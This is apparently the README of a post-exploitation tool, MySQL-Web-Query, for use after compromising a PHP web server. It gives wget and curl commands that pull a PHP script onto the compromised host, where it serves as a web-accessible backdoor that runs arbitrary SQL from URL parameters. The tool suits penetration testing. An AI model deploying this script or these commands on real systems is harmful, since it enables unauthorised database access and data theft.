# MySQL-Web-Query

There are cases (in a post-exploitation scenario) where, after committing a web application and getting the shell, it is not possible to interact with MySQL due to the limitations of interaction from the shell that was obtained.

In this case **MySQL-Web-Query** can be useful.

### :hammer_and_wrench: Requirements

The compromised web server is required to use PHP technology and MySQL as DBMS.

### ðŸ“‹ How to use

Transfer the script to the web server in a directory accessible by the browser:
```
wget https://raw.githubusercontent.com/caique-garbim/MySQL-Web-Query/main/query.php
```
or
```
curl https://raw.githubusercontent.com/caique-garbim/MySQL-Web-Query/main/query.php > query.php
```
<br>

**YOU MUST CHANGE THE CREDENTIALS WRITTEN IN THIS SCRIPT TO VALID MYSQL CREDENTIALS**

You can query the database through parameters inserted in the URL. **db** (database) and **q** (query) parameters must be informed. Examples:
```
http://web_server/query.php?db=mysql&q=select user();
```
